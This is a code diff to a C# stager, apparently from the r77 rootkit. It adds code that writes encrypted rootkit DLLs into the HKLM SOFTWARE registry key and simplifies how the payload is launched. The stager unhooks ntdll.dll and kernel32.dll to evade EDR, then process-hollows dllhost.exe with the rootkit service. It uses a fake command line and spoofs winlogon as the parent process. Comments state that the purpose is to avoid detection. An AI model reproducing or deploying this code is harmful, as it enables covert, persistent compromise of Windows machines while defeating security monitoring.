@@ -1,4 +1,6 @@
-﻿using Stager.Properties;
+﻿using Global;
+using Microsoft.Win32;
+using Stager.Properties;
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -20,43 +22,33 @@ public static class Program
 		// Unhook DLL's that are monitored by EDR.
 		// Otherwise, the call sequence analysis of process hollowing gets detected and the stager is terminated.
 		Unhook.UnhookDll("ntdll.dll");
-		if (Environment.OSVersion.Version.Major >= 10 || IntPtr.Size == 8)
+		if (Environment.OSVersion.Version.Major >= 10 || IntPtr.Size == 8) // Unhooking kernel32.dll does not work on Windows 7 x86.
 		{
-			// Unhooking kernel32.dll on Windows 7 x86 fails.
-			//TODO: Find out why unhooking kernel32.dll on Windows 7 x86 fails.
 			Unhook.UnhookDll("kernel32.dll");
 		}
 
 		Process.EnterDebugMode();
 
+		// Write r77-x86.dll and r77-x64.dll to the registry.
+		// Install.exe could also do this, but .NET has better compression routines.
+		using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE", true))
+		{
+			key.SetValue(R77Const.HidePrefix + "dll32", Decompress(Decrypt(Resources.Dll32)));
+			key.SetValue(R77Const.HidePrefix + "dll64", Decompress(Decrypt(Resources.Dll64)));
+		}
+
 		// Get r77 service executable.
-		byte[] payload32 = Decompress(Decrypt(Resources.Service32));
-		byte[] payload64 = Decompress(Decrypt(Resources.Service64));
+		byte[] payload = Decompress(Decrypt(IntPtr.Size == 4 ? Resources.Service32 : Resources.Service64));
 
 		// Executable to be used for process hollowing.
 		string path = @"C:\Windows\System32\dllhost.exe";
-		string pathWow64 = @"C:\Windows\SysWOW64\dllhost.exe";
 		string commandLine = "/Processid:" + Guid.NewGuid().ToString("B"); // Random commandline to mimic an actual dllhost.exe commandline (has no effect).
 
 		// Parent process spoofing can only be used on certain processes, particularly the PROCESS_CREATE_PROCESS privilege is required.
 		int parentProcessId = Process.GetProcessesByName("winlogon")[0].Id;
 
-		// Create the 32-bit and 64-bit instance of the r77 service.
-		if (Helper.Is64BitOperatingSystem())
-		{
-			if (IntPtr.Size == 4)
-			{
-				RunPE.Run(pathWow64, commandLine, payload32, parentProcessId);
-			}
-			else
-			{
-				RunPE.Run(path, commandLine, payload64, parentProcessId);
-			}
-		}
-		else
-		{
-			RunPE.Run(path, commandLine, payload32, parentProcessId);
-		}
+		// Start the r77 service process.
+		RunPE.Run(path, commandLine, payload, parentProcessId);
 	}
 
 	private static byte[] Decompress(byte[] data)
